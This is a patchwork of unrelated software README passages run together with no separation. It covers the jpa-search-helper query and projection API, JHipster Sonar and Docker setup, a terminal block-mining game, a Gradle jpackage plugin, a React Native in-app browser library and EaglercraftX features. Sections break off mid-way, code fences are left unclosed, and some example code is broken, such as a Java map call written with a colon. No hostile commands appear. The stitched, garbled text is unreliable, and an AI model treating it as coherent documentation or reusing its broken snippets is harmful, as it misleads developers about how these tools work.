              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""empty"",
          ""key"": ""fillerOne"",
          ""options"": {
            ""negate"": true
          }
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false
  }
  
}
```
Through *Mode 2* it is possible to manage complex filters with `AND`, `OR` and `NOT` (see later).

#### Exceptions:
- If a field does not exist, is not searchable or is not sortable, you will receive an `InvalidFieldException`.
- If the value of a field does not meet the requirements you will receive an `InvalidValueException`.
- Other cases: `JPASearchException`

## Queries - Docs
### Managed root operators
| Filter name | Library Key | Supported modes |
|-------------|-------------|-----------------|
| AND         | and         | 1, 2            |
| OR          | or          | 2               |
| NOT         | not         | 2               |

Through *Mode 1*, all filters compose exclusively an `AND` search.

To use the other operators, `OR` and `NOT`, you must use *Mode 2*

### Managed search filter operators
| Filter name               | Library Key | SQL                                | Supported modes | Value required |

#### Options
**Mode 1**
| Option description | Library Key |
|--------------------|-------------|
| Ignore case        | #i          |
| Negation           | #n          |
| Trim               | #t          |

The option keys must be appended to the filter; e.g. _?firstName_eq#i=Biagio_ or _?firstName_eq#i#n=Biagio_

**Mode 2**
| Option description | Library Key (Java attributes) |
|------------------|-------------------------------|
| Ignore case      | ignoreCase                    |
| Negation      | negate                        |
| Trim | trim                          |

For each filter it is possible to define `options`
```json
{
  // ...
      {
         ""operator"": ""eq"",
         ""key"": ""firstName"",
         ""value"": ""Biagio"",
         ""options"": {
           ""ignoreCase"": true,
           ""trim"": false,
           ""negate"": true
         }
      }
  // ...
}
```
Java object:
```java  
@Data  
public static class JPASearchFilterOptions {  
 private boolean ignoreCase;  
 private boolean trim;  
 private boolean negate;  
}  
```

### Pagination

| Filter name | Key | Fixed values
|--|--|--|
| Limit (page size) | limit
| Offset (page number) | offset
| Sort | sort | ASC, DESC

**Mode 1**: e.g. *?firstName_sort=DESC&_limit=10&_offset=0*

**Mode 2**: value root `options`:
```json
{
  ""filter"" : {
    // ...
  },
  ""options"" : {
    ""sortKey"": ""firstName"",
    ""sortDesc"": true,
    ""pageSize"": 10,
    ""pageOffset"": 1
  }
}
```
Java object:
```java
@Data
public static class JPASearchOptions {
    private String sortKey;
    private Boolean sortDesc = false;
    private Integer pageSize;
    private Integer pageOffset;
    private List<String> selections;
}
```

### Other (only for Mode 1)
- Separator for array values: `,`: e.g. _?myField_in=test1,test2_ --> values to search for: [""**test1**"", ""**test2**""]
- To escape separator: `/,`: e.g. _?myField_in=test1,test2/,test3_ --> values to search for: [""**test1**"", ""**test2,test3**""]

## Projection - Usage

### 1. `@Projectable` annotation
Start by applying the `@Projectable` annotation to the fields in your Domain Model, or alternatively your JPA entity, **that you want to make available for selection**.
If you have fields that you want to make selectable within other objects then annotate these with `@NestedProjectable`.

```java
@Data
public class Person {

  @Searchable
  private String firstName;

  @Projectable
  @Searchable
  private String lastName;

  @Projectable(entityFieldKey = ""dateOfBirth"")
  @Searchable(entityFieldKey = ""dateOfBirth"")
  private Date birthDate;

  @Searchable
  private String country;
  
  @Searchable
  private String fillerOne;
  
  @Searchable
  private String fillerTwo;

  @NestedProjectable
  @NestedSearchable
  private Company company;

  @Data
  public static class Company {

    @Searchable(entityFieldKey= ""companyEntity.name"")
    private String name;
	
	@Projectable(entityFieldKey= ""companyEntity.employeesCount"")
    @Searchable(entityFieldKey= ""companyEntity.employeesCount"")
    private int employees;
  }
}
```
The annotation allows you to specify:

- Core properties:

  - `entityFieldKey`:
    the name of the field defined on the entity bean (not to be specified if using the annotation on the entity bean). If not specified the key will be the field name.

### 2. `JPASearchRepository` interface
Your Spring JPA repository must extend `JPAProjectionRepository<YourEntityClass>`.

```java  
@Repository  
public interface PersonRepository extends JpaRepository<PersonEntity, Long>, JPASearchRepository<PersonEntity>, JPAProjectionRepository<PersonEntity> {  
  
}  
```

### 3. Projection implementation
In your manager, or in your service, or wherever you want to use the repository:

**Mode 1**: define (or add to the map used for the Mode 1 search) a map:

- key: *selections*
- value: the only fields that you want to extract separated by commas `,`

```java
// ...

  @Autowired
  private PersonRepository personRepository;

  public List<Person> advancedSearch() {
  
    // Pure example, in real use case it is expected that these filters can be passed directly by the controller
    Map<String, String> filters = new HashMap<>();
    filters.put(""firstName_eq"", ""Biagio"");
    filters.put(""lastName_startsWith#i"", ""Toz""); // ignore case
    filters.put(""birthDate_gte"", ""19910101""); 
    filters.put(""country_in"", ""IT,FR,DE"");
    filters.put(""company.name_eq#n"", ""Bad Company""); // negation
    filters.put(""company.employees_between"", ""500,5000"");
    filters.put(""fillerOne_null#n"", ""true""); // not null
    filters.put(""fillerTwo_empty"", ""true""); // empty

    // Selections
    filters.put(""selections"", ""lastName,birthDate,company.employees"");
    
    // Without sorting
    List<Map<String, Object>> result = personRepository.projection(filters, Person.class, PersonEntity.class);
  
    filters.put(""birthDate_sort"" : ""ASC""); // sorting key and sorting order
    
    // With sorting
    List<Map<String, Object>> sortedAndPaginatedSearch = personRepository.projectionWithSorting(filters, Person.class, PersonEntity.class);
    
    // ... convert the list of maps into your model
  }

// ...
```

**Mode 2**: instead of a map, you will need to use [`JPASearchInput`](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), shown here, for simplicity, in JSON format.
```json
{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""empty"",
          ""key"": ""fillerOne"",
          ""options"": {
            ""negate"": true
          }
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false,
    ""selections"" : [
		""lastName"",
		""birthDate"",
		""company.employees""
	]
  }
}
```

For both modes, the projection will return a List<Map<String, Object>> result where **the map structure and keys will reflect the entity structure** (to be clear *toJson(entityList) == toJson(mapList)*)

Note 1:
> Be careful: the default projection forces all Join relationships as LEFT JOIN. If you don't want this behavior, choose to use the repository methods (methods with 'Classic' suffix) that allow you to possibly modify only the relations you want to modify

Note 2:
> Projection, regardless of whether you want it or not, will always extract the fields that represent the primary keys of an entity (or related entities)

Note 3:

> Pagination is not supported

#### Exceptions:
- If a field does not exist, is not searchable, is not sortable or is not projectable, you will receive an `InvalidFieldException`.
- Other cases: `JPASearchException`

---

## Advanced Settings
### Join Fetch
It is possible to force joins with fetch to allow Hibernate (or your JPA framework) to execute a single query for the relationships defined on the entity. **This is only possible without pagination**:
```java
// ...

Map<String, JoinFetch> fetches = Map.of(""companyEntity"", JoinFetch.LEFT);
personRepository.findAll(filters, Person.class, fetches);

// ...
```

### Multiple entities for the same Domain Model
If you have a Domain Model that is the result of the conversion of multiple entities, it is possible to explicitly specify a map (string, string) whose key represents the name of the Domain Model field and the value is the name of the field of the entity to be searched for:
```java
// ...

Map<String, String> entityFieldMap = Map.of(""company"", ""companyEntity.name"");

// Without pagination
personRepository.findAll(filters, Person.class, fetches, entityFieldMap);

// With pagination
personRepository.findAllWithPaginationAndSorting(filters, Person.class, entityFieldMap);

// ...
```

### Multiple object for the same entity
Another special case could be where an object can be repeated within the Domain Model to represent multiple pieces of the entity. The solution for the search:
```java

@Entity
public class CoupleEntity {

  @Id
  private Long id;

  @Column(name = ""p1_fn"")
  private String p1FirstName;

  @Column(name = ""p1_ln"")
  private String p1LastName;

  @Column(name = ""p2_fn"")
  private String p2FirstName;

  @Column(name = ""p2_ln"")
  private String p2LastName;
}

@Data
public class Couple {

  @NestedSearchable
  private Person p1;

  @NestedSearchable
  private Person p2;

  @Data
  public static class Person {

    @Searchable(tags = {
            @Tag(fieldKey = ""p1.firstName"", entityFieldKey = ""p1FirstName""),
            @Tag(fieldKey = ""p2.firstName"", entityFieldKey = ""p2FirstName""),
    })
    private String firstName;

    @Searchable(tags = {
            @Tag(fieldKey = ""p1.lastName"", entityFieldKey = ""p1LastName""),
            @Tag(fieldKey = ""p2.lastName"", entityFieldKey = ""p2LastName""),
    })
    private String lastName;
  }
}
```

```bash
curl - request GET 
 - url 'https://www.myexampledomain.com/couples?
p1.firstName_iEq=Romeo
&p2.firstName_iEq=Giulietta'
```

docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

#  Terminal Block Mining Simulation Game

![Terminal Block Mining Simulation Game](block-mining-simulation-game-thumbnail.png ""Terminal Block Mining Simulation Game"")

This project contains the 'Terminal Block Mining Simulation Game', a video game where you simulate mining blocks of iron ore in the terminal.  The game uses procedural terrain generation and the game world itself is infinite.  The terrain will start generating automatically in the background near the player.  All generated terrain and player data is stored in a SQLite (or Postgres) database file.  The location of this world file defaults to the directory where you launch the game, but you can configure it with the '--block-world-file' flag.  You can also use the '--log-file' to set the location of a log file.  If the '--log-file' flag is omitted, logging will be disabled.

#  Player Movement

You can use the 'w', 'a', 's' 'd' keys to move around on the screen.  You can use the space bar to go up and the 'x' key to move down (assuming there isn't a solid block in the way on a different level).

#  Exiting/Quitting The Game

Press the 'q' key to quit the game.

#  Mining Blocks

Press the 'm' key to mine blocks.

#  Crafting

You can press the 'c' key to try and craft new blocks, such as metallic iron, and an iron pickaxe.  Currently, the game only supports four different crafting recipes:

-  Using wood to make a Wooden Pick Axe
-  Using stone and wood to make a Stone Pick Axe
-  Using iron oxide and wood to make Metallic Iron
-  Using metallic iron and wood to make an Iron Pick Axe

#  Place Blocks

Press the 'p' key to place blocks (currently only supports placing rock blocks).

#  In Game Help Menu

You can access an in-game help menu by pressing the 'ESC' key.

#  Switch Between Frames

You can switch focus between the 'frames' in the game's UI by pressing the 'TAB' key.

#  Command Line Arguments

You can run the .jar file with the '--help' flag to show a help menu:

```
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar --help
```


```
Block Mining Simulation Game - Available Command-line Arguments:

```

#  Supported Platforms

Currently, the game has only been tested to work on a default installation of Ubuntu Linux.

#  Launching The Game

Compiling the game from scratch is not necessary.  You can download pre-compiled .jar files from GitHub in the 'Releases' section for this repo:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar
```

The game should immediately launch and fill up the terminal with graphics.  You can exit the game by pressing the 'q' key.  By default, the game saves it's world data into a SQLite database file that lives in the current directory.

#  Verify The Jar Signature (Optional)

If you are concerned about the authenticity of the .jar file, you can also verify the signature using GPG:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar.asc
gpg --search-keys robert@robertelder.org
#  Should match the key for 'robert@robertelder.org'
gpg --recv-keys ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg --verify block-mining-simulation-game-single-player-client-0.0.5.jar.asc block-mining-simulation-game-single-player-client-0.0.5.jar
```

The output should look something like this:

```
gpg: Signature made Thu 01 Aug 2024 01:49:03 PM EDT
gpg:                using ECDSA key ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg: Good signature from ""Robert Elder (Created on 2024-07-31) <robert@robertelder.org>"" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: ECBD 481D BCA5 C488 04FB  D087 20B9 852C F055 8BAA
```

#  Building The Game

To build the game, you will need to set up a development environment that can support Java 17 and a version of maven that can support Java 17.

To build the JNI library, you will also need a c++ compiler and make

```
sudo apt-get install g++ make
```

Next, you can compile the game from source by running this command:

```
./res-modules/block-mining-simulation-game-single-player-client/run_single_player_client.sh
```

Once it finishes building, it should launch right into the game.

#  Alternative Key Mappings (Dvorak)

I received a couple requests to add support for reconfiguring the mapping of keyboard inputs, so I've added an option to specify a JSON config file where you can customize which input characters will trigger different actions in the game:

```
--user-interaction-config-file custom_key_config.json
```

For a Dvorak keyboard, I believe the following should work to give you the same experience that you'd get on a querty keyboard (although I can't say for sure as I don't have a Dvorak keyboard):

```
{
	""ACTION_TAB_NEXT_FRAME"": ""	"",
	""ACTION_HELP_MENU_TOGGLE"": """",
	""ACTION_Y_PLUS"": "","",
	""ACTION_Y_MINUS"": ""o"",
	""ACTION_X_PLUS"": ""e"",
	""ACTION_X_MINUS"": ""a"",
	""ACTION_Z_PLUS"": "" "",
	""ACTION_Z_MINUS"": ""q"",
	""ACTION_MINING"": ""m"",
	""ACTION_CRAFTING"": ""j"",
	""ACTION_QUIT"": ""'"",
	""ACTION_PLACE_BLOCK"": ""l""
}
```

You can see the default user interaction config file printed to standard out by running the jar with the following parameter:

```
--print-user-interaction-config
```

A Gradle plugin to package modular Java application as standalone bundles/installers for Windows, macOS and Linux with [jpackage](https://docs.oracle.com/en/java/javase/21/docs/specs/man/jpackage.html). 

This [GradleX](https://gradlex.org) plugin is maintained by me, [Jendrik Johannes](https://github.com/jjohannes).
I offer consulting and training for Gradle and/or the Java Module System - please [reach out](mailto:jendrik.johannes@gmail.com) if you are interested.
There is also my [YouTube channel](https://www.youtube.com/playlist?list=PLWQK2ZdV4Yl2k2OmC_gsjDpdIBTN0qqkE) on Gradle topics.

If you have a suggestion or a question, please [open an issue](https://github.com/gradlex-org/java-module-packaging/issues/new).

# Java Modules with Gradle

If you plan to build Java Modules with Gradle, you should consider using these plugins on top of Gradle core:

- [`id(""org.gradlex.java-module-dependencies"")`](https://github.com/gradlex-org/java-module-dependencies)  
  Avoid duplicated dependency definitions and get your Module Path under control
- [`id(""org.gradlex.jvm-dependency-conflict-resolution"")`](https://github.com/gradlex-org/jvm-dependency-conflict-resolution)  
  Additional metadata for widely-used modules and patching facilities to add missing metadata
- [`id(""org.gradlex.java-module-testing"")`](https://github.com/gradlex-org/java-module-testing)  
  Proper test setup for Java Modules
- [`id(""org.gradlex.extra-java-module-info"")`](https://github.com/gradlex-org/extra-java-module-info)  
  Only if your (existing) project cannot avoid using non-module legacy Jars
- [`id(""org.gradlex.java-module-packaging"")`](https://github.com/gradlex-org/java-module-packaging)  
  Package standalone applications for Windows, macOS and Linux

[In episodes 31, 32, 33 of Understanding Gradle](https://github.com/jjohannes/understanding-gradle) I explain what these plugins do and why they are needed.
[<img src=""https://onepiecesoftware.github.io/img/videos/31.png"" width=""260"">](https://www.youtube.com/watch?v=X9u1taDwLSA&list=PLWQK2ZdV4Yl2k2OmC_gsjDpdIBTN0qqkE)

# How to use?

Working example projects to inspect:
- [java-module-system](https://github.com/jjohannes/java-module-system) contains a compact sample and further documentation
- [gradle-project-setup-howto](https://github.com/jjohannes/gradle-project-setup-howto/tree/java_module_system) is a full-fledged Java Module System project setup

For general information about how to structure Gradle builds and apply community plugins like this one to all subprojects
you can check out my [Understanding Gradle video series](https://www.youtube.com/playlist?list=PLWQK2ZdV4Yl2k2OmC_gsjDpdIBTN0qqkE).

## Plugin dependency

Add this to the build file of your convention plugin's build
(e.g. `build-logic/build.gradle(.kts)` or `buildSrc/build.gradle(.kts)`).

```
dependencies {
    implementation(""org.gradlex:java-module-packaging:1.0"")
}
```

## Apply and use the plugin

In your convention plugin, apply the plugin and configure the _targets_.

```
plugins {
    id(""org.gradlex.java-module-packaging"")
}

javaModulePackaging {
    target(""ubuntu-22.04"") {
        operatingSystem = OperatingSystemFamily.LINUX
        architecture = MachineArchitecture.X86_64
    }
    target(""macos-13"") {
        operatingSystem = OperatingSystemFamily.MACOS
        architecture = MachineArchitecture.X86_64
    }
    target(""macos-14"") {
        operatingSystem = OperatingSystemFamily.MACOS
        architecture = MachineArchitecture.ARM64
    }
    target(""windows-2022"") {
        operatingSystem = OperatingSystemFamily.WINDOWS
        architecture = MachineArchitecture.X86_64
    }

    primaryTarget(target(""macos-14""))
}
```

You can now run _target-specific_ builds:

```
./gradlew assembleWindows
```

```
./gradlew runWindows
```

There are some additional configuration options that can be used:

```
javaModulePackaging {
    applicationName();
    applicationVersion();
    applicationDescription = """"
    vendor = ""My Company"" 
    copyright = ""(c) My Company"" 
    jpackageResources.setFrom(...);
    resources.from(...)
}
```

## Using target specific variants of libraries (like JavaFX)

The plugin uses Gradle's [variant-aware dependency management](https://docs.gradle.org/current/userguide/variant_model.html)
to select target-specific Jars based on the configured [targets](#apply-and-use-the-plugin).
For this, such a library needs to be published with [Gradle Module Metadata](https://docs.gradle.org/current/userguide/publishing_gradle_module_metadata.html)
and contain the necessary information about the available target-specific Jars.
If the metadata is missing or incomplete, you should use the [org.gradlex.jvm-dependency-conflict-resolution](https://github.com/gradlex-org/jvm-dependency-conflict-resolution)
plugin to add the missing information via [addTargetPlatformVariant](https://gradlex.org/jvm-dependency-conflict-resolution/#patch-dsl-block).

For example, for JavaFX it may look like this:
```
jvmDependencyConflicts.patch {
  listOf(""base"", ""graphics"", ""controls"").forEach { jfxModule ->
    module(""org.openjfx:javafx-$jfxModule"") {
      addTargetPlatformVariant(""linux"", OperatingSystemFamily.LINUX, MachineArchitecture.X86_64)
      addTargetPlatformVariant(""linux-aarch64"", OperatingSystemFamily.LINUX, MachineArchitecture.ARM64)
      addTargetPlatformVariant(""mac"", OperatingSystemFamily.MACOS, MachineArchitecture.X86_64)
      addTargetPlatformVariant(""mac-aarch64"", OperatingSystemFamily.MACOS, MachineArchitecture.ARM64)
      addTargetPlatformVariant(""win"", OperatingSystemFamily.WINDOWS, MachineArchitecture.X86_64)
    }
  }   
}
```

## Testing against multiple targets

> [!WARNING]
> Currently, the following only works in combination with [Blackbox Test Suites configured by the _org.gradlex.java-module-testing_ plugin](https://github.com/gradlex-org/java-module-testing?tab=readme-ov-file#blackbox-test-suites).

Tests run against the _primary_ target, which is either the local machine you run the build on, or what is configured via `javaModulePackaging.primaryTarget(...)`.
If you want to run the test multiple times against each target you configured, you can configure this as follows:

```
javaModulePackaging {
    multiTargetTestSuite(testing.suites[""test""])
}
```

Then, there will be a test task available for each target, such as `testWindows-2022` or `testMacos-14`.

## Running on GitHub Actions

Target-specific _tasks_ such as `assembleWindows-2022` or `assembleMacos-14` only run on the fitting operating system and architecture.
If you want to build your software for multiple targets and have GitHub actions available, you can use different
runners to create packages for the different targets. A setup for this can look like this
(assuming your targets are named: `ubuntu-22.04`, `windows-2022`, `macos-13`, `macos-14`):

```
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version-file: ./gradle/java-version.txt
      - uses: gradle/actions/setup-gradle@v3
      - run: ""./gradlew check""

  package:
    needs: check
    strategy:
      matrix:
        os: [ubuntu-22.04, windows-2022, macos-13, macos-14]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version-file: ./gradle/java-version.txt
      - uses: gradle/actions/setup-gradle@v3
      - run: ""./gradlew assemble${{ matrix.os }}""
      - uses: actions/upload-artifact@v4
        with:
          name: Application Package ${{ matrix.os }}

To avoid re-compilation of the Java code on each of the runners, you can run a
[Gradle remote cache node](https://docs.gradle.com/build-cache-node).

The [java-module-system](https://github.com/jjohannes/java-module-system) project is an example that
uses GitHub actions with a Gradle remote build cache.

## Installation

```bash
$ yarn add @swan-io/react-native-browser
# --- or ---
$ npm install --save @swan-io/react-native-browser
```

## Quickstart

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";
import { useCallback } from ""react"";
import { Button, SafeAreaView } from ""react-native"";
import parseUrl from ""url-parse"";

const App = () => {
  const handleOnPress = useCallback(() => {
    openBrowser(""https://swan.io"", {
      onClose: (url) => {
        if (url) {
          const { protocol, host, query } = parseUrl(url, true);
          const origin = `${protocol}//${host}`;

          if (origin === ""com.company.myapp://close"") {
            console.log(JSON.stringify(query, null, 2));
          }
        }
      },
    }).catch((error) => {
      console.error(error);
    });
  }, []);

  return (
    <SafeAreaView>
      <Button title=""Open browser"" onPress={handleOnPress} />
    </SafeAreaView>
  );
};
```

## API

### openBrowser(url: string, options: Options)

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";

openBrowser(""https://swan.io"", {
  animationType: """", // ""fade"" | ""slide"" (default to ""slide"")
  dismissButtonStyle: ""close"", // ""cancel"" | ""close"" | ""done"" (default to ""close"")
  barTintColor: ""#FFF"", // in-app browser UI background color
  controlTintColor: ""#000"", // in-app browser buttons color
  onOpen: () => {
    // fired on browser opened
    // useful to switch the StatusBar color, for example
  },
  onClose: (url) => {
    // fired on browser closed
    // url will be defined if the browser has been closed via deeplink
  },
}).catch((error) => {
  console.error(error);
});
```

> [!IMPORTANT]
> On Android, the Chrome app must be opened at least once for this to work ‚Äî a step often overlooked when using emulators in development.

## Handle deeplinks

In order to receive deeplink on browser close event, you have to setup them first. We **highly** recommand defining a custom schema + url for this specific task. For example, `com.company.myapp://close`.

### On iOS

First, you need to **[enable react-native deeplinks support](https://reactnative.dev/docs/linking#enabling-deep-links)**. Then, edit your `Info.plist` file to add:

```xml
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleTypeRole</key>
    <string>Viewer</string>
    <key>CFBundleURLName</key>
    <string>com.company.myapp</string>
    <key>CFBundleURLSchemes</key>
    <array>
      <string>com.company.myapp</string>
    </array>
  </dict>
</array>
```

### On Android

Edit your `AndroidManifest.xml` to add ([more documentation](https://developer.android.com/training/app-links/deep-linking)):

```xml
<activity android:name="".MainActivity"">
  <intent-filter>
    <action android:name=""android.intent.action.VIEW"" />
    <category android:name=""android.intent.category.BROWSABLE"" />
    <category android:name=""android.intent.category.DEFAULT"" />
    <data android:scheme=""com.company.myapp"" android:host=""close"" />
  </intent-filter>
</activity>
```

> [!TIP]
> Once the redirect URL is visited (a `GET` hits your server), handle the result and perform a server redirect to `com.company.myapp://close?success=true` to close the browser (and pass any data back to your app using query params ‚ú®).

## Run the example app

```bash
$ git clone git@github.com:swan-io/react-native-browser.git
$ cd react-native-browser/example

$ yarn install && yarn start
# --- or ---
$ npm install && npm run start

## Singleplayer

As of January 2024, singleplayer and shared worlds have been added to EaglercraftX 1.8.

Worlds are saved to your browser's local storage and are available even if your device does not have an internet connection. You can also import and export worlds in EaglercraftX as EPK files to copy them between devices and send them to your friends.

You can also import and export your existing vanilla Minecraft 1.8 worlds into EaglercraftX using ZIP files if you want to try playing all your old 1.8 maps in a modern browser. The glitch that caused some chunks to become corrupt when exporting worlds as vanilla in Eaglercraft 1.5.2 no longer happens in EaglercraftX 1.8, its perfect now. Beware that the inventories of LAN world players are not saved when the world is converted to vanilla, and pets (dogs, cats, horses, etc) might sometimes forget their owners due to the UUID changes.

## Shared Worlds

**This feature used to be known as ""LAN Worlds"" but has been renamed to ""Shared Worlds"" to avoid confusion**

If you would like to invite other players to join your singleplayer world and play the game together, use the ""Invite"" button in the pause menu. You can configure gamemode and cheats for the other players joining your world, you can also decide if you would like to hide your world from other people on your wifi network or advertise your world to them. If hidden is ""off"" then other people on your same wifi network will see your world listed on their game's ""Multiplayer"" screen with all of their servers like how sharing LAN worlds behave in vanilla Minecraft 1.8.

Once you press ""Start Shared World"", EaglercraftX 1.8 will give you a ""join code"" (usually 5 letters) to share with your friends. On a different device, go the ""Multiplayer"" screen and press ""Direct Connect"" and press ""Join Shared World"", enter the join code given to you when you started the shared world and press ""Join World"". Given a few seconds, the client should successfully be able to join your shared world from any other device on the internet that also has unrestricted internet access. If it does not work, check the ""Network Settings"" screen and make sure you and your friends all have the same set of shared world relay URLs configured or your clients will not be able to find each other.

If you would like to host your own relay, the JAR file and instructions can be downloaded from the ""Network Settings"" screen in the client. EaglercraftX 1.8 uses the same ""LAN world"" relay server that is used by Eaglercraft 1.5.2, if you would like the relay source code find a random copy of the Eaglercraft 1.5.2 source code and it should be located in the ""sp-relay"" folder. The relay has not been updated since then, it has only been renamed from ""LAN world relay"" to ""Shared world relay"".

## PBR Shaders

EaglercraftX 1.8 includes a deferred physically-based renderer modeled after the GTA V rendering engine with many new improvements and a novel raytracing technique for fast realistic reflections. It can be enabled in the ""Shaders"" menu in the game's options screen. Shader packs in EaglercraftX are just a component of resource packs, so any custom shaders you install will be in the form of a resource pack. EaglercraftX also comes with a very well optimized built-in PBR shader pack and also a built-in PBR material texture pack to give all blocks and items in the game realistic lighting and materials that looks better than most vanilla Minecraft shader packs. The default shader and texture packs were created from scratch by lax1dude, shaders packs made for vanilla Minecraft will not work in EaglercraftX and no shaders in EaglercraftX were taken from vanilla Minecraft shader packs.

## Voice Chat

EaglercraftX 1.8 includes an integrated voice-chat service that can be used in shared worlds and also on multiplayer servers when it is enabled by the server owner. This feature also uses WebRTC like shared worlds, so be careful that you don't leak your IP address accidentally by using it on a public server. If you own a website and don't want people to use voice chat on it, edit the `eaglercraftXOpts` variable in your index.html and add `allowVoiceClient: false`.

## Resource Packs

EaglercraftX 1.8 allows you to use any vanilla Minecraft 1.8 resource pack in your browser by importing it as a zip file, resource packs are saved to your browser's local storage and are saved between page refreshes. This can be used to add the original C418 soundtrack back into the game, download and import [this pack](https://bafybeiayojww5jfyzvlmtuk7l5ufkt7nlfto7mhwmzf2vs4bvsjd5ouiuq.ipfs.nftstorage.link/?filename=Music_For_Eaglercraft.zip) to add music back to Eaglercraft. A known bug with the debug desktop runtime is that sound files in resource packs do not play, this may be fixed in the future but is not a high priority issue.

If you are creating a resource pack and want to disable the blur filter on the main menu panorama, create a file called `assets/minecraft/textures/gui/title/background/enable_blur.txt` in your pack and set it's contents to `enable_blur=0`

## Making a Server

To make a server for EaglercraftX 1.8 the recommended software to use is EaglercraftXBungee (""EaglerXBungee"") which is included in this repository in the `gateway/EaglercraftXBungee` folder. This is a plugin designed to be used with BungeeCord to allow Eaglercraft players to join your BungeeCord server. It is assumed that the reader already knows what BungeeCord is and has a working server set up that is joinable via java edition. If you don't know what BungeeCord is, please research the topic yourself first before continuing. Waterfall and FlameCord have also been tested, but EaglerXBungee was natively compiled against BungeeCord.

There is an experimental velocity plugin available in `gateway/EaglercraftXVelocity` but it is still in development and not recommended for public servers, so be sure to check for updates regularly if you use it. Configuration files are basically identical to EaglercraftXBungee so its safe to just directy copy in your old EaglercraftXBungee config files to the `plugins/eaglerxvelocity` folder and they should work with a minimal number of edits if you are migrating your network from BungeeCord to Velocity.

### Installation

